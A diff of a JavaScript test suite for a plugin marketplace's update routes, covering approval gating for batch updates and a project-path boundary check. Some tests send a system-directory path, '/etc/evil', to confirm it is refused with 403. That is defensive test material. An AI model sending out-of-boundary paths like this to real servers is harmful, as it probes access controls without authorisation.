-      // that asks, the batch is refused and points at the one-package door.
+      // Purpose: if install is ever raised to a tier that asks, a batch cannot
+      // carry one tier token per package; it is refused before the gate.
       gateRegistry = registryAskingForInstalls();
       agentHeader = 'agent-token';
 
       const res = await request(fixtureServer)
         .post('/api/marketplace/updates')
-        .send({ apply: true });
+        .send({ apply: true, targets: [shown(globalRoot())] });
 
       expect(res.status).toBe(403);
       expect(res.body.code).toBe('batch_update_needs_approval');
-      expect(res.body.error).toContain('/api/marketplace/packages/:name/update');
-      expect(updateFlow.checkInstallations).not.toHaveBeenCalled();
-      // Refused before the gate: no approval request nobody could ever redeem.
+      expect(updateFlow.planInstallations).not.toHaveBeenCalled();
       expect(installGateInputs()).toEqual([]);
       expect(approvals.listPending()).toEqual([]);
     });
 
     it('still lets the person in the app apply a batch when install asks for approval', async () => {
-      // Purpose: the refusal is for callers the gate would ask; the person who
-      // decides approvals is never asked about their own click.
       gateRegistry = registryAskingForInstalls();
 
       const res = await request(fixtureServer)
         .post('/api/marketplace/updates')
-        .send({ apply: true });
+        .send({ apply: true, targets: [shown(globalRoot())] });
 
       expect(res.status).toBe(200);
-      expect(updateFlow.checkInstallations).toHaveBeenCalled();
+      expect(updateFlow.applyPlan).toHaveBeenCalled();
+    });
+
+    it('names the requested project the way the caller spelled it', async () => {
+      const projectDir = join(dorkHome, 'real-project');
+      const projectRoot = join(projectDir, '.dork', 'plugins', 'sample-plugin');
+      writePackageManifest(projectRoot, { ...buildSamplePluginManifest() });
+      now.set(projectRoot, { latestVersion: '2.0.0', disclosed: runs('echo hi') });
+      vi.mocked(validateBoundary).mockResolvedValue(projectDir);
+
+      try {
+        const res = await request(fixtureServer)
+          .post('/api/marketplace/updates')
+          .send({
+            apply: true,
+            projectPath: '/work/link-to-project',
+            targets: [shown(projectRoot)],
+          });
+
+        expect(res.status).toBe(200);
+        expect(vi.mocked(scanInstallationRecords)).toHaveBeenCalledWith(dorkHome, {
+          projectPath: projectDir,
+        });
+        expect(installGateInputs()).toEqual([
+          { name: 'sample-plugin', projectPath: '/work/link-to-project' },
+        ]);
+        expect(onPluginsChanged).toHaveBeenCalledWith({
+          projectPath: '/work/link-to-project',
+          packageName: 'sample-plugin',
+          action: 'install',
+        });
+      } finally {
+        vi.mocked(validateBoundary).mockResolvedValue('/resolved/project');
+      }
     });
 
     it('returns 403 and applies nothing when projectPath is outside the boundary', async () => {
@@ -2231,10 +2343,10 @@ describe('Marketplace Routes', () => {
 
       const res = await request(fixtureServer)
         .post('/api/marketplace/updates')
-        .send({ apply: true, projectPath: '/etc/evil' });
+        .send({ apply: true, projectPath: '/etc/evil', targets: [shown(globalRoot())] });
 
       expect(res.status).toBe(403);
-      expect(updateFlow.checkInstallations).not.toHaveBeenCalled();
+      expect(updateFlow.planInstallations).not.toHaveBeenCalled();
     });
   });
 
@@ -2289,7 +2401,7 @@ describe('Marketplace Routes', () => {
 
       const res = await request(fixtureServer)
         .post('/api/marketplace/packages/sample-plugin/update')
-        .send({ apply: true, projectPath: '/etc/evil' });
+        .send({ projectPath: '/etc/evil' });
 
       expect(res.status).toBe(403);
       expect(updateFlow.run).not.toHaveBeenCalled();
